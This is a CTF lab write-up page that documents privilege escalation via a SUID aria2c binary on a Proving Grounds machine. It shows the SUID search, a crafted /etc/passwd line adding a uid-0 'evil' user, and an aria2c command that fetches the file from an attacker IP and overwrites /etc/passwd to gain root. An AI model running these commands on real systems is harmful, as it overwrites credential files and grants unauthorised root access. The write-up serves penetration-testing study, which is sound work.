---
layout: default
title: Aria2c
parent: SUID
nav_order: 4
---

# Aria2c

---

## Check SUID Permissions

```bash
www-data@assertion:/dev/shm$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/aria2c
/usr/bin/newgrp
/usr/bin/newgidmap
```

_/usr/bin/aria2c_ is interesting.

We can use _aria2c_ to overwrite files we download from the attack machine.

Let's add a user to the /etc/passwd file on our attack machine and then upload to the target.

The following will add a root user with the password _i<3hacking_

```bash
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash
```

![evil](../../../../assets/images/ctfs/proving_grounds/assertion/evil.png)

Now move to the _/etc_ directory on the target and upload our malicious _passwd_ file

```bash
www-data@assertion:/etc$ aria2c -o passwd http://192.168.45.217:8000/passwd --allow-overwrite=true

11/17 02:51:11 [NOTICE] Downloading 1 item(s)
\
11/17 02:51:11 [NOTICE] Download complete: /etc/passwd

Download Results:
gid   |stat|avg speed  |path/URI
======+====+===========+=======================================================
87fe7c|OK  |        n/a|/etc/passwd

Status Legend:
(OK):download completed.


```

Now we can switch user's to our _evil_ user and get a root shell.

```bash
www-data@assertion:/etc$ su evil
Password:
root@assertion:/etc# id
uid=0(root) gid=0(root) groups=0(root)
root@assertion:/etc# whoami
root

```
